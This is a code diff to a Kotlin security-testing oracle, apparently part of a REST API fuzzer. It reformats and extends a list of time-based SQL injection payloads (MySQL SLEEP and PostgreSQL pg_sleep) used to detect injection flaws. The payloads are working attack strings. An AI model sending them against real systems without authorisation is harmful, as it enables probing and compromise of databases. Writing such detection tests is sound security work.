@@ -229,15 +229,25 @@ object RestSecurityOracle {
      */
     val SQLI_PAYLOADS = listOf(
         // Simple sleep-based payloads for MySQL
-        "' OR SLEEP(%d)-- -",
-        "\" OR SLEEP(%d)-- -",
-        "' OR SLEEP(%d)=0-- -",
-        "\" OR SLEEP(%d)=0-- -",
+        "' OR SLEEP(%.2f)-- -",
+        "\" OR SLEEP(%.2f)-- -",
+        "' OR SLEEP(%.2f)=0-- -",
+        "\" OR SLEEP(%.2f)=0-- -",
+        // Integer-based delays
+        "' OR SLEEP(%.0f)-- -",
+        "\" OR SLEEP(%.0f)-- -",
+        "' OR SLEEP(%.0f)=0-- -",
+        "\" OR SLEEP(%.0f)=0-- -",
         // Simple sleep-based payloads for PostgreSQL
-        "' OR select pg_sleep(%d)-- -",
-        "\" OR select pg_sleep(%d)-- -",
-        "' OR (select pg_sleep(%d)) IS NULL-- -",
-        "\' OR (select pg_sleep(%d)) IS NULL-- -",
+        "' OR select pg_sleep(%.2f)-- -",
+        "\" OR select pg_sleep(%.2f)-- -",
+        "' OR (select pg_sleep(%.2f)) IS NULL-- -",
+        "\' OR (select pg_sleep(%.2f)) IS NULL-- -",
+        // Integer-based delays
+        "' OR select pg_sleep(%.0f)-- -",
+        "\" OR select pg_sleep(%.0f)-- -",
+        "' OR (select pg_sleep(%.0f)) IS NULL-- -",
+        "\' OR (select pg_sleep(%.0f)) IS NULL-- -",
     )
 
 
